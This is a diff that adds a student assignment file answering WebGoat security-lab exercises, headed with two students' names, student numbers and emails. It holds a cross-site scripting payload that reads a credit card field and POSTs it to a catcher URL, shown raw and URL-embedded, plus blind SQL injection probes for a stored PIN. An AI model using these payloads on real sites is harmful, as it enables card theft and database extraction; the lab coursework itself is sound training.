@@ -1,0 +1,27 @@
+#Zihan Zhao, 1001103708, simon.zhao@mail.utoronto.ca
+#Hao Wang, 1001303500, ternal.wang@mail.utoronto.ca
+
+Part2:
+<script> 
+var card_arr = document.querySelectorAll("input[name='input1']");
+var credURL="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCreditCard="+card_arr[0].value; 
+var xmlHTTP = new XMLHttpRequest(); 
+xmlHTTP.open("POST",credURL, false); 
+xmlHTTP.send(null);
+</script>
+
+The decoded URL is as following:
+"
+http://localhost:8090/WebGoat/start.mvc#attack/1731484628/900?input1=123&input2=<script>
+	var card_arr = document.querySelectorAll("input[name='input1']");
+	var credURL="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCreditCard="+card_arr[0].value;
+	var xmlHTTP = new XMLHttpRequest();
+	xmlHTTP.open("POST",credURL, false);
+	xmlHTTP.send(null);
+</script>
+"
+
+
+Part8:
+101 AND ((select pin from credit where cc_number = 1234123412341234) < <Nnumber1>)
+101 AND ((select pin from credit where cc_number = 1234123412341234) > <Nnumber2>)
